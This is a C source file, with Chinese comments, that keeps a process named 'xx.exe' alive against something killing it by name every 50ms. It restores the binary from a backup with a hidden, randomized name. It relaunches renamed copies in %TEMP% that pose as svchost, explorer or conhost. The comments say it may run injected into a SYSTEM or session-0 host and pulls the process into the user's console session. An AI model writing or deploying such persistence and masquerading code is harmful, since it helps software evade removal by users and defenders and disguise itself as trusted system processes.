/* window/parts/ensure.c —— 被 window.c 直接 include：确保 xx 存活 / 从随机备份还原 / 会话拉取 */

static void EnsureXxRunning(void)
{
    if (IsXxRunning()) return;   // 已有实例，不启动

    WCHAR xxPath[MAX_PATH];
    GetXxExePath(xxPath, MAX_PATH);

    /* 若被对手删除，从同目录的随机备份文件还原（名字每会话不同，二进制无明文） */
    if (GetFileAttributesW(xxPath) == INVALID_FILE_ATTRIBUTES) {
        WCHAR bak[MAX_PATH];
        WCHAR nm[32];
        wcscpy_s(bak, MAX_PATH, xxPath);
        {
            WCHAR *p = wcsrchr(bak, L'\\');
            if (p) *(p + 1) = L'\0';
        }
        XXBackupNameW(g_pSharedView, nm, _countof(nm));
        wcscat_s(bak, MAX_PATH, nm);
        SecureZeroMemory(nm, sizeof(nm));
        if (GetFileAttributesW(bak) != INVALID_FILE_ATTRIBUTES)
            CopyFileW(bak, xxPath, FALSE);
    }

    /* 复活目标不能写死成 <dir>\xx.exe：对手按名杀 xx.exe 每 50ms 一轮，
       而运行期可能已经切换到 %TEMP% 下改名的接管副本（svchost/explorer/conhost）。
       XXRespawnTargetPath 优先返回共享内存里记录的"最后完成初始化的实例"，
       记录失效（文件被删/被清）才退回交付本体 —— 见 xxipc.h。 */
    {
        WCHAR target[MAX_PATH] = L"";
        if (!XXRespawnTargetPath(g_pSharedView, xxPath, target, MAX_PATH)) {
            WriteWinLog(L"EnsureXxRunning: 没有可复活的实例（xx.exe 与备份文件都不可用）");
            return;
        }
        wcsncpy_s(xxPath, MAX_PATH, target, _TRUNCATE);
    }

    /* 拉进控制台会话：本实例可能被注入进 SYSTEM/会话 0 的宿主，
       直接 CreateProcess 会让 xx 落到不可见会话里（弹窗等于没有，还会触发
       Windows 的"交互式服务检测"）。 */
    {
        DWORD newPid = 0;
        if (XXLaunchInConsoleSession(xxPath, FALSE, &newPid) && newPid) {
            WriteWinLog(L"EnsureXxRunning: 已在控制台会话拉起 xx.exe pid=%lu", newPid);
        } else {
            STARTUPINFOW si;
            PROCESS_INFORMATION pi;
            memset(&si, 0, sizeof(si));
            si.cb = sizeof(si);
            si.dwFlags = STARTF_USESHOWWINDOW;
            si.wShowWindow = SW_SHOWNORMAL;   /* 别用 SW_HIDE：它会让新进程的第一次 ShowWindow 失效 */
            memset(&pi, 0, sizeof(pi));
            if (CreateProcessW(xxPath, NULL, NULL, NULL, FALSE, CREATE_NO_WINDOW,
                               NULL, NULL, &si, &pi)) {
                if (pi.hProcess) CloseHandle(pi.hProcess);
                if (pi.hThread) CloseHandle(pi.hThread);
                WriteWinLog(L"EnsureXxRunning: 同会话回退拉起 xx.exe");
            } else {
                WriteWinLog(L"EnsureXxRunning: 拉起 xx.exe 失败 err=%lu", GetLastError());
            }
        }
    }
}
